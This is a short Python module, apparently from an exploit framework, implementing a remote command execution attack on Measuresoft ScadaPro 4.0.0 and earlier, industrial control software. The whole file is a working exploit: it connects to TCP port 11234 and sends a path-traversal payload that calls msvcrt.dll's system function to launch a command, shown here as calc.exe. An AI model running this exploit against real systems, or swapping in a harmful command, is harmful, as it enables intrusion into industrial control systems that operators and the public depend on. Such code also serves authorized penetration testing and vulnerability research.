import socket
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 11234):
    """
    Measuresoft ScadaPro <= 4.0.0 - Remote Command Execution
    Original Exploit by: Luigi Auriemma, TecR0c, mr_me
    Ref: http://aluigi.altervista.org/adv/scadapro_1-adv.txt
    """

    # Typical vulnerable command:
    # xf%..\..\..\..\..\windows\system32\msvcrt.dll,system,calc.exe
    cmd = r"..\..\..\..\..\windows\system32\msvcrt.dll,system,cmd /c calc.exe"
    payload = f"xf%{cmd}\r\n".encode()

    try:
        logger.info(f"[*] Connecting to {target}:{port}")
        s = socket.create_connection((target, port), timeout=5)
        s.recv(1024)  # Optional banner read
        s.sendall(payload)
        logger.info("[+] RCE payload sent: launched 'calc.exe'")
        s.close()
        return True
    except Exception as e:
        logger.error(f"[!] ScadaPro RCE error: {e}")
    return False
